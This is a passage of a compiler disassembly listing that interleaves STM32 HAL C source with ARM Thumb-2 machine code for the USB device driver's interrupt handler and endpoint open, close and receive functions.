  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8002050:	687b      	ldr	r3, [r7, #4]
 8002052:	681b      	ldr	r3, [r3, #0]
 8002054:	4618      	mov	r0, r3
 8002056:	f006 fac4 	bl	80085e2 <USB_ReadInterrupts>
 800205a:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 800205c:	68fb      	ldr	r3, [r7, #12]
 800205e:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8002062:	2b00      	cmp	r3, #0
 8002064:	d003      	beq.n	800206e <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8002066:	6878      	ldr	r0, [r7, #4]
 8002068:	f000 fb59 	bl	800271e <PCD_EP_ISR_Handler>

    return;
 800206c:	e110      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 800206e:	68fb      	ldr	r3, [r7, #12]
 8002070:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8002074:	2b00      	cmp	r3, #0
 8002076:	d013      	beq.n	80020a0 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8002078:	687b      	ldr	r3, [r7, #4]
 800207a:	681b      	ldr	r3, [r3, #0]
 800207c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002080:	b29a      	uxth	r2, r3
 8002082:	687b      	ldr	r3, [r7, #4]
 8002084:	681b      	ldr	r3, [r3, #0]
 8002086:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 800208a:	b292      	uxth	r2, r2
 800208c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8002090:	6878      	ldr	r0, [r7, #4]
 8002092:	f00a fd4c 	bl	800cb2e <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8002096:	2100      	movs	r1, #0
 8002098:	6878      	ldr	r0, [r7, #4]
 800209a:	f000 f8fc 	bl	8002296 <HAL_PCD_SetAddress>

    return;
 800209e:	e0f7      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 80020a0:	68fb      	ldr	r3, [r7, #12]
 80020a2:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80020a6:	2b00      	cmp	r3, #0
 80020a8:	d00c      	beq.n	80020c4 <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 80020aa:	687b      	ldr	r3, [r7, #4]
 80020ac:	681b      	ldr	r3, [r3, #0]
 80020ae:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80020b2:	b29a      	uxth	r2, r3
 80020b4:	687b      	ldr	r3, [r7, #4]
 80020b6:	681b      	ldr	r3, [r3, #0]
 80020b8:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 80020bc:	b292      	uxth	r2, r2
 80020be:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 80020c2:	e0e5      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 80020c4:	68fb      	ldr	r3, [r7, #12]
 80020c6:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 80020ca:	2b00      	cmp	r3, #0
 80020cc:	d00c      	beq.n	80020e8 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 80020ce:	687b      	ldr	r3, [r7, #4]
 80020d0:	681b      	ldr	r3, [r3, #0]
 80020d2:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80020d6:	b29a      	uxth	r2, r3
 80020d8:	687b      	ldr	r3, [r7, #4]
 80020da:	681b      	ldr	r3, [r3, #0]
 80020dc:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 80020e0:	b292      	uxth	r2, r2
 80020e2:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 80020e6:	e0d3      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 80020e8:	68fb      	ldr	r3, [r7, #12]
 80020ea:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 80020ee:	2b00      	cmp	r3, #0
 80020f0:	d034      	beq.n	800215c <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 80020f2:	687b      	ldr	r3, [r7, #4]
 80020f4:	681b      	ldr	r3, [r3, #0]
 80020f6:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80020fa:	b29a      	uxth	r2, r3
 80020fc:	687b      	ldr	r3, [r7, #4]
 80020fe:	681b      	ldr	r3, [r3, #0]
 8002100:	f022 0204 	bic.w	r2, r2, #4
 8002104:	b292      	uxth	r2, r2
 8002106:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 800210a:	687b      	ldr	r3, [r7, #4]
 800210c:	681b      	ldr	r3, [r3, #0]
 800210e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002112:	b29a      	uxth	r2, r3
 8002114:	687b      	ldr	r3, [r7, #4]
 8002116:	681b      	ldr	r3, [r3, #0]
 8002118:	f022 0208 	bic.w	r2, r2, #8
 800211c:	b292      	uxth	r2, r2
 800211e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8002122:	687b      	ldr	r3, [r7, #4]
 8002124:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8002128:	2b01      	cmp	r3, #1
 800212a:	d107      	bne.n	800213c <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 800212c:	687b      	ldr	r3, [r7, #4]
 800212e:	2200      	movs	r2, #0
 8002130:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8002134:	2100      	movs	r1, #0
 8002136:	6878      	ldr	r0, [r7, #4]
 8002138:	f00a ffd6 	bl	800d0e8 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 800213c:	6878      	ldr	r0, [r7, #4]
 800213e:	f00a fd2f 	bl	800cba0 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 8002142:	687b      	ldr	r3, [r7, #4]
 8002144:	681b      	ldr	r3, [r3, #0]
 8002146:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800214a:	b29a      	uxth	r2, r3
 800214c:	687b      	ldr	r3, [r7, #4]
 800214e:	681b      	ldr	r3, [r3, #0]
 8002150:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8002154:	b292      	uxth	r2, r2
 8002156:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 800215a:	e099      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 800215c:	68fb      	ldr	r3, [r7, #12]
 800215e:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002162:	2b00      	cmp	r3, #0
 8002164:	d027      	beq.n	80021b6 <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8002166:	687b      	ldr	r3, [r7, #4]
 8002168:	681b      	ldr	r3, [r3, #0]
 800216a:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800216e:	b29a      	uxth	r2, r3
 8002170:	687b      	ldr	r3, [r7, #4]
 8002172:	681b      	ldr	r3, [r3, #0]
 8002174:	f042 0208 	orr.w	r2, r2, #8
 8002178:	b292      	uxth	r2, r2
 800217a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 800217e:	687b      	ldr	r3, [r7, #4]
 8002180:	681b      	ldr	r3, [r3, #0]
 8002182:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002186:	b29a      	uxth	r2, r3
 8002188:	687b      	ldr	r3, [r7, #4]
 800218a:	681b      	ldr	r3, [r3, #0]
 800218c:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8002190:	b292      	uxth	r2, r2
 8002192:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8002196:	687b      	ldr	r3, [r7, #4]
 8002198:	681b      	ldr	r3, [r3, #0]
 800219a:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800219e:	b29a      	uxth	r2, r3
 80021a0:	687b      	ldr	r3, [r7, #4]
 80021a2:	681b      	ldr	r3, [r3, #0]
 80021a4:	f042 0204 	orr.w	r2, r2, #4
 80021a8:	b292      	uxth	r2, r2
 80021aa:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 80021ae:	6878      	ldr	r0, [r7, #4]
 80021b0:	f00a fcdc 	bl	800cb6c <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 80021b4:	e06c      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 80021b6:	68fb      	ldr	r3, [r7, #12]
 80021b8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80021bc:	2b00      	cmp	r3, #0
 80021be:	d040      	beq.n	8002242 <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 80021c0:	687b      	ldr	r3, [r7, #4]
 80021c2:	681b      	ldr	r3, [r3, #0]
 80021c4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80021c8:	b29a      	uxth	r2, r3
 80021ca:	687b      	ldr	r3, [r7, #4]
 80021cc:	681b      	ldr	r3, [r3, #0]
 80021ce:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 80021d2:	b292      	uxth	r2, r2
 80021d4:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 80021d8:	687b      	ldr	r3, [r7, #4]
 80021da:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 80021de:	2b00      	cmp	r3, #0
 80021e0:	d12b      	bne.n	800223a <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 80021e2:	687b      	ldr	r3, [r7, #4]
 80021e4:	681b      	ldr	r3, [r3, #0]
 80021e6:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80021ea:	b29a      	uxth	r2, r3
 80021ec:	687b      	ldr	r3, [r7, #4]
 80021ee:	681b      	ldr	r3, [r3, #0]
 80021f0:	f042 0204 	orr.w	r2, r2, #4
 80021f4:	b292      	uxth	r2, r2
 80021f6:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 80021fa:	687b      	ldr	r3, [r7, #4]
 80021fc:	681b      	ldr	r3, [r3, #0]
 80021fe:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002202:	b29a      	uxth	r2, r3
 8002204:	687b      	ldr	r3, [r7, #4]
 8002206:	681b      	ldr	r3, [r3, #0]
 8002208:	f042 0208 	orr.w	r2, r2, #8
 800220c:	b292      	uxth	r2, r2
 800220e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 8002212:	687b      	ldr	r3, [r7, #4]
 8002214:	2201      	movs	r2, #1
 8002216:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 800221a:	687b      	ldr	r3, [r7, #4]
 800221c:	681b      	ldr	r3, [r3, #0]
 800221e:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8002222:	b29b      	uxth	r3, r3
 8002224:	089b      	lsrs	r3, r3, #2
 8002226:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 800222a:	687b      	ldr	r3, [r7, #4]
 800222c:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 8002230:	2101      	movs	r1, #1
 8002232:	6878      	ldr	r0, [r7, #4]
 8002234:	f00a ff58 	bl	800d0e8 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 8002238:	e02a      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 800223a:	6878      	ldr	r0, [r7, #4]
 800223c:	f00a fc96 	bl	800cb6c <HAL_PCD_SuspendCallback>
    return;
 8002240:	e026      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 8002242:	68fb      	ldr	r3, [r7, #12]
 8002244:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8002248:	2b00      	cmp	r3, #0
 800224a:	d00f      	beq.n	800226c <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 800224c:	687b      	ldr	r3, [r7, #4]
 800224e:	681b      	ldr	r3, [r3, #0]
 8002250:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002254:	b29a      	uxth	r2, r3
 8002256:	687b      	ldr	r3, [r7, #4]
 8002258:	681b      	ldr	r3, [r3, #0]
 800225a:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 800225e:	b292      	uxth	r2, r2
 8002260:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 8002264:	6878      	ldr	r0, [r7, #4]
 8002266:	f00a fc54 	bl	800cb12 <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 800226a:	e011      	b.n	8002290 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 800226c:	68fb      	ldr	r3, [r7, #12]
 800226e:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002272:	2b00      	cmp	r3, #0
 8002274:	d00c      	beq.n	8002290 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 8002276:	687b      	ldr	r3, [r7, #4]
 8002278:	681b      	ldr	r3, [r3, #0]
 800227a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800227e:	b29a      	uxth	r2, r3
 8002280:	687b      	ldr	r3, [r7, #4]
 8002282:	681b      	ldr	r3, [r3, #0]
 8002284:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 8002288:	b292      	uxth	r2, r2
 800228a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 800228e:	bf00      	nop
  }
}
 8002290:	3710      	adds	r7, #16
 8002292:	46bd      	mov	sp, r7
 8002294:	bd80      	pop	{r7, pc}

08002296 <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 8002296:	b580      	push	{r7, lr}
 8002298:	b082      	sub	sp, #8
 800229a:	af00      	add	r7, sp, #0
 800229c:	6078      	str	r0, [r7, #4]
 800229e:	460b      	mov	r3, r1
 80022a0:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80022a2:	687b      	ldr	r3, [r7, #4]
 80022a4:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80022a8:	2b01      	cmp	r3, #1
 80022aa:	d101      	bne.n	80022b0 <HAL_PCD_SetAddress+0x1a>
 80022ac:	2302      	movs	r3, #2
 80022ae:	e013      	b.n	80022d8 <HAL_PCD_SetAddress+0x42>
 80022b0:	687b      	ldr	r3, [r7, #4]
 80022b2:	2201      	movs	r2, #1
 80022b4:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 80022b8:	687b      	ldr	r3, [r7, #4]
 80022ba:	78fa      	ldrb	r2, [r7, #3]
 80022bc:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 80022c0:	687b      	ldr	r3, [r7, #4]
 80022c2:	681b      	ldr	r3, [r3, #0]
 80022c4:	78fa      	ldrb	r2, [r7, #3]
 80022c6:	4611      	mov	r1, r2
 80022c8:	4618      	mov	r0, r3
 80022ca:	f006 f94a 	bl	8008562 <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 80022ce:	687b      	ldr	r3, [r7, #4]
 80022d0:	2200      	movs	r2, #0
 80022d2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80022d6:	2300      	movs	r3, #0
}
 80022d8:	4618      	mov	r0, r3
 80022da:	3708      	adds	r7, #8
 80022dc:	46bd      	mov	sp, r7
 80022de:	bd80      	pop	{r7, pc}

080022e0 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 80022e0:	b580      	push	{r7, lr}
 80022e2:	b084      	sub	sp, #16
 80022e4:	af00      	add	r7, sp, #0
 80022e6:	6078      	str	r0, [r7, #4]
 80022e8:	4608      	mov	r0, r1
 80022ea:	4611      	mov	r1, r2
 80022ec:	461a      	mov	r2, r3
 80022ee:	4603      	mov	r3, r0
 80022f0:	70fb      	strb	r3, [r7, #3]
 80022f2:	460b      	mov	r3, r1
 80022f4:	803b      	strh	r3, [r7, #0]
 80022f6:	4613      	mov	r3, r2
 80022f8:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 80022fa:	2300      	movs	r3, #0
 80022fc:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80022fe:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002302:	2b00      	cmp	r3, #0
 8002304:	da0e      	bge.n	8002324 <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002306:	78fb      	ldrb	r3, [r7, #3]
 8002308:	f003 0307 	and.w	r3, r3, #7
 800230c:	1c5a      	adds	r2, r3, #1
 800230e:	4613      	mov	r3, r2
 8002310:	009b      	lsls	r3, r3, #2
 8002312:	4413      	add	r3, r2
 8002314:	00db      	lsls	r3, r3, #3
 8002316:	687a      	ldr	r2, [r7, #4]
 8002318:	4413      	add	r3, r2
 800231a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 800231c:	68fb      	ldr	r3, [r7, #12]
 800231e:	2201      	movs	r2, #1
 8002320:	705a      	strb	r2, [r3, #1]
 8002322:	e00e      	b.n	8002342 <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002324:	78fb      	ldrb	r3, [r7, #3]
 8002326:	f003 0207 	and.w	r2, r3, #7
 800232a:	4613      	mov	r3, r2
 800232c:	009b      	lsls	r3, r3, #2
 800232e:	4413      	add	r3, r2
 8002330:	00db      	lsls	r3, r3, #3
 8002332:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002336:	687a      	ldr	r2, [r7, #4]
 8002338:	4413      	add	r3, r2
 800233a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800233c:	68fb      	ldr	r3, [r7, #12]
 800233e:	2200      	movs	r2, #0
 8002340:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 8002342:	78fb      	ldrb	r3, [r7, #3]
 8002344:	f003 0307 	and.w	r3, r3, #7
 8002348:	b2da      	uxtb	r2, r3
 800234a:	68fb      	ldr	r3, [r7, #12]
 800234c:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 800234e:	883a      	ldrh	r2, [r7, #0]
 8002350:	68fb      	ldr	r3, [r7, #12]
 8002352:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 8002354:	68fb      	ldr	r3, [r7, #12]
 8002356:	78ba      	ldrb	r2, [r7, #2]
 8002358:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 800235a:	78bb      	ldrb	r3, [r7, #2]
 800235c:	2b02      	cmp	r3, #2
 800235e:	d102      	bne.n	8002366 <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 8002360:	68fb      	ldr	r3, [r7, #12]
 8002362:	2200      	movs	r2, #0
 8002364:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 8002366:	687b      	ldr	r3, [r7, #4]
 8002368:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800236c:	2b01      	cmp	r3, #1
 800236e:	d101      	bne.n	8002374 <HAL_PCD_EP_Open+0x94>
 8002370:	2302      	movs	r3, #2
 8002372:	e00e      	b.n	8002392 <HAL_PCD_EP_Open+0xb2>
 8002374:	687b      	ldr	r3, [r7, #4]
 8002376:	2201      	movs	r2, #1
 8002378:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 800237c:	687b      	ldr	r3, [r7, #4]
 800237e:	681b      	ldr	r3, [r3, #0]
 8002380:	68f9      	ldr	r1, [r7, #12]
 8002382:	4618      	mov	r0, r3
 8002384:	f003 fe8c 	bl	80060a0 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002388:	687b      	ldr	r3, [r7, #4]
 800238a:	2200      	movs	r2, #0
 800238c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 8002390:	7afb      	ldrb	r3, [r7, #11]
}
 8002392:	4618      	mov	r0, r3
 8002394:	3710      	adds	r7, #16
 8002396:	46bd      	mov	sp, r7
 8002398:	bd80      	pop	{r7, pc}

0800239a <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800239a:	b580      	push	{r7, lr}
 800239c:	b084      	sub	sp, #16
 800239e:	af00      	add	r7, sp, #0
 80023a0:	6078      	str	r0, [r7, #4]
 80023a2:	460b      	mov	r3, r1
 80023a4:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80023a6:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80023aa:	2b00      	cmp	r3, #0
 80023ac:	da0e      	bge.n	80023cc <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80023ae:	78fb      	ldrb	r3, [r7, #3]
 80023b0:	f003 0307 	and.w	r3, r3, #7
 80023b4:	1c5a      	adds	r2, r3, #1
 80023b6:	4613      	mov	r3, r2
 80023b8:	009b      	lsls	r3, r3, #2
 80023ba:	4413      	add	r3, r2
 80023bc:	00db      	lsls	r3, r3, #3
 80023be:	687a      	ldr	r2, [r7, #4]
 80023c0:	4413      	add	r3, r2
 80023c2:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80023c4:	68fb      	ldr	r3, [r7, #12]
 80023c6:	2201      	movs	r2, #1
 80023c8:	705a      	strb	r2, [r3, #1]
 80023ca:	e00e      	b.n	80023ea <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80023cc:	78fb      	ldrb	r3, [r7, #3]
 80023ce:	f003 0207 	and.w	r2, r3, #7
 80023d2:	4613      	mov	r3, r2
 80023d4:	009b      	lsls	r3, r3, #2
 80023d6:	4413      	add	r3, r2
 80023d8:	00db      	lsls	r3, r3, #3
 80023da:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023de:	687a      	ldr	r2, [r7, #4]
 80023e0:	4413      	add	r3, r2
 80023e2:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023e4:	68fb      	ldr	r3, [r7, #12]
 80023e6:	2200      	movs	r2, #0
 80023e8:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 80023ea:	78fb      	ldrb	r3, [r7, #3]
 80023ec:	f003 0307 	and.w	r3, r3, #7
 80023f0:	b2da      	uxtb	r2, r3
 80023f2:	68fb      	ldr	r3, [r7, #12]
 80023f4:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80023f6:	687b      	ldr	r3, [r7, #4]
 80023f8:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80023fc:	2b01      	cmp	r3, #1
 80023fe:	d101      	bne.n	8002404 <HAL_PCD_EP_Close+0x6a>
 8002400:	2302      	movs	r3, #2
 8002402:	e00e      	b.n	8002422 <HAL_PCD_EP_Close+0x88>
 8002404:	687b      	ldr	r3, [r7, #4]
 8002406:	2201      	movs	r2, #1
 8002408:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 800240c:	687b      	ldr	r3, [r7, #4]
 800240e:	681b      	ldr	r3, [r3, #0]
 8002410:	68f9      	ldr	r1, [r7, #12]
 8002412:	4618      	mov	r0, r3
 8002414:	f004 fa08 	bl	8006828 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002418:	687b      	ldr	r3, [r7, #4]
 800241a:	2200      	movs	r2, #0
 800241c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 8002420:	2300      	movs	r3, #0
}
 8002422:	4618      	mov	r0, r3
 8002424:	3710      	adds	r7, #16
 8002426:	46bd      	mov	sp, r7
 8002428:	bd80      	pop	{r7, pc}

0800242a <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 800242a:	b580      	push	{r7, lr}
 800242c:	b086      	sub	sp, #24
 800242e:	af00      	add	r7, sp, #0
 8002430:	60f8      	str	r0, [r7, #12]
 8002432:	607a      	str	r2, [r7, #4]
 8002434:	603b      	str	r3, [r7, #0]
 8002436:	460b      	mov	r3, r1
 8002438:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 800243a:	7afb      	ldrb	r3, [r7, #11]
 800243c:	f003 0207 	and.w	r2, r3, #7
 8002440:	4613      	mov	r3, r2
 8002442:	009b      	lsls	r3, r3, #2
 8002444:	4413      	add	r3, r2
 8002446:	00db      	lsls	r3, r3, #3
 8002448:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800244c:	68fa      	ldr	r2, [r7, #12]
 800244e:	4413      	add	r3, r2
 8002450:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 8002452:	697b      	ldr	r3, [r7, #20]
 8002454:	687a      	ldr	r2, [r7, #4]
 8002456:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002458:	697b      	ldr	r3, [r7, #20]
